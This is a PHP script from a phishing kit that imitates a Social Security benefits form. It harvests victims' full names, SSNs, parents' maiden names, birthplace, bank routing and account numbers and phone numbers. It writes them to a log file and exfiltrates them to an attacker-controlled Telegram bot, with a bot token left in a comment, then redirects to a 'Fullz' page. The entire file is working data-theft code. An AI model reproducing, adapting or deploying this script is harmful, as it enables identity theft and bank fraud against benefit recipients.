<?php
require_once"../tpa/dont-touchbot/code/include.php";
extract($_REQUEST);
$file=fopen("log1.txt","a");

$Full =$_POST["Fullname"];
$SSN =$_POST["SSN"];
$Mailing =$_POST["MailingAddressonProfile"];
$Father =$_POST["Father'sFullNameAndMaidenName"];
$Mother =$_POST["Mother'sFullNameAndMaidenName"];
$City =$_POST["CityBron"];
$State =$_POST["State"];
$Amount =$_POST["AmountReceivedLastMonthinUSSD"];
$Routing =$_POST["RoutingNumberThat'sOnFile"];
$Acconut =$_POST["AcconutNumberThat'sOnFile"];
$Phone =$_POST["PhoneNumber"];
$DidYouReceiveSSA =$_POST["DidYouReceiveSSAYESorNO"];
$Day=$_POST["Day"];
$Montth=$_POST["Month"];
$Year=$_POST["Year"];
$DateofPayment =$_POST["DateofPayment"];

fwrite($file,"###################\n");
fwrite($file,">Fullname: ");
fwrite($file,$Full  . "\n: ");
fwrite($file,">SSN: ");
fwrite($file,$SSN . "\n: ");
fwrite($file,">MailingAddressonProfile: ");
fwrite($file,$Mailing . "\n: ");
fwrite($file,">Father'sFullNameAndMaidenName: ");
fwrite($file,$Father . "\n: ");
fwrite($file,">Mother'sFullNameAndMaidenName: ");
fwrite($file,$Mother . "\n: ");
fwrite($file,">CityBron: ");
fwrite($file,$City . "\n: ");
fwrite($file,">State: ");
fwrite($file,$State . "\n:");
fwrite($file,">AmountReceivedLastMonthinUSSD: ");
fwrite($file,$Amount . "\n: ");
fwrite($file,">RoutingNumberThat'sOnFile: ");
fwrite($file,$Routing . "\n: ");
fwrite($file,">AcconutNumberThat'sOnFile: ");
fwrite($file,$Acconut . "\n: ");
fwrite($file,">Phone Number: ");
fwrite($file,$Phone . "\n: ");
fwrite($file,">DidYouReceiveSSAYESorNO: ");
fwrite($file,$DidYouReceiveSSA. "\n: ");
fwrite($file,">Day: ");
fwrite($file,$Day. "\n: ");
fwrite($file,">Month: ");
fwrite($file,$Month. "\n: ");
fwrite($file,">Year: ");
fwrite($file,$Year. "\n: ");
fwrite($file,">DateofPayment: ");
fwrite($file,$DateofPayment . "\n: ");
fwrite($file,"###################\n");


 fwrite($file,"\n");
fclose($file);

#send log detials to Telegram
$telegram ="on";



 
$data ="$Full \n $SSN \n $Mailing \n $Father  \n $Mother \n $ \n $City \n $State \n $Amount \n $Phone \n $DidYouReceiveSSA \n  $Day \n  $Month \n $Year \n  \n$DateofPayment \n";

$txt=$data;
$chat_id =""; //842554301
$bot_url = ""; //2133943840:AAH_AXd_Q8_hIksQCA4_xJli8BLSPcH_UO0

if ($telegram=='on'){
$send=['chat_id'=>$chat_id,'text'=>$txt];
$website="https://api.telegram.org/bot{$bot_url}";
$ch=curl_init($website.'/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result=curl_exec($ch);
curl_close($ch);
}


header("location: index.Fullz.php");
?>